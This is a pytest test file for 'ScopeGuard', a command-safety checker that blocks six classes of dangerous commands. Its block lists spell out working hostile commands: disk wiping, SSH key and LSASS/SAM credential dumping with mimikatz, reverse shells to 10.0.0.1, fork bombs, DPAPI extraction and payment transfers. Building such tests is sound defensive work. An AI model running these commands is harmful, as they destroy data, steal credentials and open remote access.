"""
Unit & Integration Test: ScopeGuard 6 Sovereign Invariants & Safe Command Assertion
=============================================================================
Validates:
1. The 6 Sovereign Invariant constants and telemetry status (6/6 SECURE)
2. assert_safe_command detects forbidden commands:
   - NO_SYSTEM32_MODIFICATION (rm -rf /, format c:, del /f /s /q c:\\windows)
   - NO_RAW_CREDENTIAL_EXPOSURE (SSH keys, SAM registry, LSASS dump)
   - NO_UNAUTHORIZED_NETWORK_LISTENERS (nc -l, socat listeners, reverse shells)
   - NO_DESTRUCTIVE_FORCE_REBOOT (shutdown /s /f, reboot -f, fork bombs)
   - NO_DPAPI_VAULT_DUMP (sekurlsa::dpapi, dpapi::masterkeys)
   - REQUIRE_HUMAN_APPROVAL_FOR_PAYMENTS (stripe charges, bitcoin transfers)
3. Safe developer commands pass without exception
4. WorktreeManager sandboxed command execution integration with ScopeGuard
=============================================================================
"""

import os
import sys
import pytest
from pathlib import Path

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from core.runtime.scope_guard import (
    ScopeGuard,
    ScopeGuardException,
    assert_safe_command,
    NO_SYSTEM32_MODIFICATION,
    NO_RAW_CREDENTIAL_EXPOSURE,
    NO_UNAUTHORIZED_NETWORK_LISTENERS,
    NO_DESTRUCTIVE_FORCE_REBOOT,
    NO_DPAPI_VAULT_DUMP,
    REQUIRE_HUMAN_APPROVAL_FOR_PAYMENTS,
    SOVEREIGN_INVARIANTS,
)


def test_sovereign_invariants_definition():
    """Validates the 6 Sovereign Invariants are properly defined and exposed."""
    assert len(SOVEREIGN_INVARIANTS) == 6
    assert NO_SYSTEM32_MODIFICATION in SOVEREIGN_INVARIANTS
    assert NO_RAW_CREDENTIAL_EXPOSURE in SOVEREIGN_INVARIANTS
    assert NO_UNAUTHORIZED_NETWORK_LISTENERS in SOVEREIGN_INVARIANTS
    assert NO_DESTRUCTIVE_FORCE_REBOOT in SOVEREIGN_INVARIANTS
    assert NO_DPAPI_VAULT_DUMP in SOVEREIGN_INVARIANTS
    assert REQUIRE_HUMAN_APPROVAL_FOR_PAYMENTS in SOVEREIGN_INVARIANTS

    guard = ScopeGuard()
    status = guard.get_invariants_status()
    assert len(status) == 6
    for inv in SOVEREIGN_INVARIANTS:
        assert inv in status
        assert status[inv]["status"] == "SECURE"
        assert status[inv]["enforced"] is True


def test_invariant_1_system32_and_root_destruction():
    """Detects commands that attempt to format drives or delete Windows/root."""
    forbidden = [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf /etc",
        "rm -rf /bin",
        "rm -rf /windows",
        "rm -rf C:/Windows",
        "format c:",
        "format c: /fs:ntfs",
        "format d:",
        "del /f /s /q c:\\windows",
        "del /f /s /q c:/windows",
        "del /s /q c:\\windows\\system32",
        "rd /s /q c:\\windows",
        "rmdir /s /q c:\\windows",
        "Remove-Item -Path C:\\Windows -Recurse -Force",
        "Format-Volume -DriveLetter C",
        "Clear-Disk 0",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == NO_SYSTEM32_MODIFICATION


def test_invariant_2_raw_credential_exposure():
    """Detects commands that attempt to harvest keys, SAM, or LSASS memory."""
    forbidden = [
        "cat ~/.ssh/id_rsa",
        "type %USERPROFILE%\\.ssh\\id_rsa",
        "type ~/.ssh/id_ed25519",
        "Get-Content C:\\Users\\NiranX\\.ssh\\id_rsa",
        "mimikatz privilege::debug",
        "sekurlsa::logonpasswords",
        "procdump.exe -ma lsass.exe lsass.dmp",
        "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump lsass.dmp",
        "reg save HKLM\\SAM sam.save",
        "reg save HKLM\\SYSTEM system.save",
        "vaultcmd /list",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == NO_RAW_CREDENTIAL_EXPOSURE


def test_invariant_3_unauthorized_network_listeners():
    """Detects commands that spawn unauthorized listening sockets or reverse shells."""
    forbidden = [
        "nc -l -p 4444",
        "nc -lvp 8080",
        "ncat -l 9999",
        "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "sh -i >& /dev/udp/10.0.0.1/53 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == NO_UNAUTHORIZED_NETWORK_LISTENERS


def test_invariant_4_destructive_force_reboot():
    """Detects commands that force machine shutdown, reboot, or fork bombs."""
    forbidden = [
        "shutdown /s /f",
        "shutdown /r /f",
        "shutdown -s -t 0",
        "shutdown -r -t 0",
        "shutdown /p",
        "reboot -f",
        "poweroff -f",
        "init 0",
        "init 6",
        ":(){ :|:& };:",
        "%0|%0",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == NO_DESTRUCTIVE_FORCE_REBOOT


def test_invariant_5_dpapi_vault_dump():
    """Detects unauthorized commands attempting to extract DPAPI masterkeys."""
    forbidden = [
        "sekurlsa::dpapi",
        "dpapi::masterkeys",
        "dpapi::chrome",
        "dpapi::cred",
        "mimikatz dpapi::masterkeys",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == NO_DPAPI_VAULT_DUMP


def test_invariant_6_require_human_approval_for_payments():
    """Detects automated financial transactions and enforces human approval gate."""
    forbidden = [
        "stripe charges create --amount 2000 --currency usd",
        "stripe payment_intents create --amount 5000",
        "stripe payouts create --amount 1000",
        "bitcoin-cli sendtoaddress 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa 0.5",
        "solana transfer 7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU 10",
        "cast send --rpc-url http://localhost:8545 0x123 1ether",
        "paypal payouts create",
    ]

    for cmd in forbidden:
        with pytest.raises(ScopeGuardException) as exc_info:
            assert_safe_command(cmd)
        assert exc_info.value.invariant == REQUIRE_HUMAN_APPROVAL_FOR_PAYMENTS


def test_safe_developer_commands_pass():
    """Validates that regular developer workflows and commands run without restriction."""
    safe_commands = [
        "git status",
        "git add .",
        "git commit -m 'feat: test implementation'",
        "npm run build",
        "python nexus.py --test-all",
        "pytest core/tests",
        "echo 'Hello Nexus'",
        "dir",
        "ls -la",
        "mkdir my_folder",
        "python -m venv venv",
        "bun run test",
        "cargo build",
    ]

    guard = ScopeGuard()
    for cmd in safe_commands:
        # Standalone function
        assert_safe_command(cmd)
        # Class static method
        ScopeGuard.assert_safe_command(cmd)
        # Instance method
        assert guard.evaluate_command(cmd) is True
